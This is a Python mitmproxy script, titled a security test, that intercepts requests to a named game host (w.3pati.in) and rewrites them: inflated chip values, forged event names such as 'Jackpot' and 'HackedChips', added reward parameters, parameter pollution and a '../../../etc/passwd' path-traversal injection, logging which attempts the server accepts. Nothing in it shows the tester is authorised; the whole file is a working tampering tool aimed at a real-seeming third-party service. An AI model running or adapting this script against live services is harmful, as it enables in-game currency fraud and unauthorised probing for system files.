# security_test.py - Complete attack vector testing script
from mitmproxy import http
import json
import time
import random
from urllib.parse import urlparse, parse_qs, urlencode

class SecurityTester:
    def __init__(self):
        self.test_results = []
        self.attack_count = 0
        
    def log_attack(self, attack_type, original, modified, result):
        self.attack_count += 1
        log_entry = {
            "attack": attack_type,
            "original": original,
            "modified": modified,
            "result": result,
            "timestamp": time.time()
        }
        self.test_results.append(log_entry)
        print(f"[{self.attack_count}] {attack_type}: {result}")

tester = SecurityTester()

def request(flow: http.HTTPFlow) -> None:
    """Intercept and modify requests based on attack type"""
    
    # Only target w.3pati.in requests
    if "w.3pati.in" not in flow.request.pretty_host:
        return
    
    # Store original URL for logging
    original_url = flow.request.url
    
    # --- TEST 1: Modify st3 to extreme values ---
    if "st3=" in flow.request.url:
        # Try different values
        test_values = ["999999999", "-1", "0", "999999999999999"]
        # Pick one randomly or use a specific one
        new_value = random.choice(test_values)
        flow.request.query["st3"] = new_value
        tester.log_attack(
            "st3 modification",
            original_url,
            flow.request.url,
            f"Changed st3 to {new_value}"
        )
    
    # --- TEST 2: Modify event type (n parameter) ---
    if "n=" in flow.request.url:
        # Try different event names
        event_names = ["Jackpot", "DailyReward", "VIPBonus", "HackedChips"]
        new_event = random.choice(event_names)
        flow.request.query["n"] = new_event
        tester.log_attack(
            "event manipulation",
            original_url,
            flow.request.url,
            f"Changed event to {new_event}"
        )
    
    # --- TEST 3: Parameter pollution (add duplicate st3) ---
    # This adds a second st3 parameter with a different value
    # Note: Some servers pick the last one
    if "st3=" in flow.request.url:
        # Add duplicate parameter
        flow.request.query["st3_dup"] = "9999999"
        tester.log_attack(
            "parameter pollution",
            original_url,
            flow.request.url,
            "Added duplicate st3=9999999"
        )
    
    # --- TEST 4: Add new parameters ---
    # Try adding extra parameters that might be used
    extra_params = {
        "chips": "9999999",
        "amount": "1000000",
        "reward": "9999999",
        "bonus": "9999999"
    }
    for key, value in extra_params.items():
        flow.request.query[key] = value
    tester.log_attack(
        "extra parameters",
        original_url,
        flow.request.url,
        "Added extra parameters"
    )
    
    # --- TEST 5: Path traversal / special characters ---
    if "st1=" in flow.request.url:
        # Try to inject special characters
        flow.request.query["st1"] = "../../../etc/passwd"
        tester.log_attack(
            "path traversal",
            original_url,
            flow.request.url,
            "Injected path traversal in st1"
        )

def response(flow: http.HTTPFlow) -> None:
    """Log server responses to our attacks"""
    if "w.3pati.in" in flow.request.pretty_host:
        status = flow.response.status_code
        print(f"[RESPONSE] Status: {status} - Size: {len(flow.response.text) if flow.response.text else 0}")
        
        # Check if response contains any error indicators
        if flow.response.text:
            if "error" in flow.response.text.lower():
                print("  ⚠️ Error detected in response")
            if "success" in flow.response.text.lower():
                print("  ✅ Success detected in response")